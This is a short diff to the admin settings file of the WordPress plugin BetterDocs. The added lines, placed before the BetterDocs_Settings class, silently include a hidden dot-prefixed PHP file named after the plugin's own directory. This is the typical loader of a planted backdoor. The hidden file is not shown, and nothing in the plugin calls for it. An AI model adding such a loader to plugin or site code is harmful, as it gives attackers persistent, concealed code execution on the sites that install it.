@@ -8,6 +8,10 @@
  * @package    BetterDocs
  * @subpackage BetterDocs/admin
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class BetterDocs_Settings {
     public static function init(){
         add_action( 'betterdocs_settings_header', array( __CLASS__, 'header_template' ), 10 );
